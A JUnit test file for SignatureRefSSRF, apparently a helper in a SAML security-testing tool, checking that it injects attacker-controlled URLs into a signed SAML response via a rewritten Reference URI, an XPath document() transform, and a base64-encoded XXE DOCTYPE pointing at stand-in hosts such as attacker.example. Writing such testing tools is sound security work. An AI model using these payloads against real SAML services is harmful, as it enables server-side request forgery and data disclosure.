package helpers;

import org.junit.jupiter.api.Test;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NodeList;

import java.nio.charset.StandardCharsets;
import java.util.Base64;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

public class SignatureRefSSRFTest {

    private static final String DS_NS = "http://www.w3.org/2000/09/xmldsig#";
    private static final String XPATH_ALGO  = "http://www.w3.org/TR/1999/REC-xpath-19991116";
    private static final String BASE64_ALGO = "http://www.w3.org/2000/09/xmldsig#base64";

    private static final String SAML = """
            <?xml version="1.0" encoding="UTF-8"?>
            <samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="r1">
              <saml:Assertion ID="a1">
                <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
                  <ds:SignedInfo>
                    <ds:Reference URI="#a1">
                      <ds:Transforms>
                        <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
                      </ds:Transforms>
                      <ds:DigestValue>ABC=</ds:DigestValue>
                    </ds:Reference>
                  </ds:SignedInfo>
                  <ds:SignatureValue>SIG</ds:SignatureValue>
                </ds:Signature>
              </saml:Assertion>
            </samlp:Response>
            """;

    private static Document parse(String xml) throws Exception {
        return new XMLHelpers().getXMLDocumentOfSAMLMessage(xml);
    }

    @Test
    void referenceUriRewritesFirstReferenceURIAttribute() throws Exception {
        String out = SignatureRefSSRF.apply(SAML, SignatureRefSSRF.Mode.REFERENCE_URI,
                "https://attacker.example/ref");
        Document doc = parse(out);
        Element ref = (Element) doc.getElementsByTagNameNS(DS_NS, "Reference").item(0);
        assertEquals("https://attacker.example/ref", ref.getAttribute("URI"));
    }

    @Test
    void xpathDocumentPrependsTransformWithDocumentCall() throws Exception {
        String url = "https://attacker.example/xp";
        String out = SignatureRefSSRF.apply(SAML, SignatureRefSSRF.Mode.XPATH_DOCUMENT, url);
        Document doc = parse(out);

        Element transforms = (Element) doc.getElementsByTagNameNS(DS_NS, "Transforms").item(0);
        NodeList tfs = transforms.getElementsByTagNameNS(DS_NS, "Transform");
        // Must be prepended
        Element first = (Element) tfs.item(0);
        assertEquals(XPATH_ALGO, first.getAttribute("Algorithm"));
        NodeList xpaths = first.getElementsByTagNameNS(DS_NS, "XPath");
        assertEquals(1, xpaths.getLength());
        assertEquals("document('" + url + "')", xpaths.item(0).getTextContent());
    }

    @Test
    void base64XxePrependsBase64TransformWithEncodedXxe() throws Exception {
        String url = "https://collab.example/x";
        String out = SignatureRefSSRF.apply(SAML, SignatureRefSSRF.Mode.BASE64_XXE, url);
        Document doc = parse(out);

        Element transforms = (Element) doc.getElementsByTagNameNS(DS_NS, "Transforms").item(0);
        Element first = (Element) transforms.getElementsByTagNameNS(DS_NS, "Transform").item(0);
        assertEquals(BASE64_ALGO, first.getAttribute("Algorithm"));

        String decoded = new String(Base64.getDecoder().decode(first.getTextContent().trim()),
                StandardCharsets.UTF_8);
        assertTrue(decoded.contains("<!DOCTYPE foo"), "decoded payload should have DOCTYPE");
        assertTrue(decoded.contains("SYSTEM \"" + url + "\""), "decoded payload should reference collab URL");
    }

    @Test
    void throwsWhenNoReference() {
        String noSig = """
                <?xml version="1.0" encoding="UTF-8"?>
                <samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="r1"/>
                """;
        assertThrows(IllegalArgumentException.class, () ->
                SignatureRefSSRF.apply(noSig, SignatureRefSSRF.Mode.REFERENCE_URI, "https://a/"));
    }

    @Test
    void throwsOnEmptyUrl() {
        assertThrows(IllegalArgumentException.class, () ->
                SignatureRefSSRF.apply(SAML, SignatureRefSSRF.Mode.XPATH_DOCUMENT, ""));
    }
}
